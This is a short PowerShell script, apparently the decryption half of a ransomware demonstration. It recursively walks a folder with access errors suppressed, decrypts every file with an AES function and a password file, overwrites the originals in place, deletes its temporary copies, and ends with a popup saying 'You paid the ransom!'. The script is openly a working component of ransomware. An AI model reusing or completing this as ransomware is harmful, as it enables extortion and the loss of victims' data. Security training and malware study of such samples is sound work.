#Loads decryption function from the Unprotect-AesFile
. "C:\Path\Unprotect-AesFile.ps1" 

#path to the source file/folder/drive to be decrypted 
$FilestoDecrypt = "C:\Path\Example_Test_Files"

#storage path where decrypted files will be stored temporarily 
$Storage = "C:\Path\Storage" 

#Gets each object from the path given by using a for loop and recursion is used to reach all files if needed 
#errors (mainly access based) are ignored so the program can run smoothly 
Get-ChildItem -Path $FilestoDecrypt -File -Recurse -Force -ErrorAction SilentlyContinue | 
    Where-Object { $_.FullName } | 
    ForEach-Object {
        #creates storage file 
        New-Item -Path $Storage -ItemType Directory -Force | Out-Null

        #New path is calculated while keeping the original folder structure 
        $relativePath = $_.FullName.Substring($FilestoDecrypt.Length)
        $newPath   = Join-Path -Path $Storage -ChildPath ($relativePath -replace '\.enc$', '' )
    
        #Call the decryption function, Unprotect-AesFile on each object 
        #Overwrite the contents of the original object with the decrypted contents in the temporary storage file 
        try {
            Write-Host "Decrypting: $($_.FullName)"
            Unprotect-AesFile -InFile $_.FullName -OutFile $newPath -PasswordFile Password.txt
            [IO.File]::WriteAllBytes($_.FullName, [IO.File]::ReadAllBytes($newPath))
        }
        catch {
            Write-Warning "Unable to decrypt: $($_.FullName). Receiving error: $($_.Message)"
        }   
}
#remove storage directory as those contents are no longer needed 
Remove-Item -Path $Storage -Recurse -Force 

$wshell = New-Object -ComObject Wscript.Shell
$result = $wshell.popup("You paid the ransom! Your files are back to normal", 0)